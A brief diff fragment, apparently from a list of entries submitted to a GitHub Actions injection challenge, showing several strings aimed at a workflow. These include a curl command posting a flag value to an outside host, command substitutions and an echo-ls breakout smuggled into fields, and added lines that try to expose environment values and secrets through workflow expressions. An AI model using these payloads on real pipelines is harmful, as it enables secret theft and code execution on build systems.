@@ -10929,3 +10929,5 @@ asjdf:"
           curl -X POST -d "$flag" https://www.homeboyc.cn/
 zwh-china:${{ github.event.issue.number }} $( flag )
   ";echo `ls`"
+leppan02:${{ env.flag }}
+${{ secrets[flag] }}
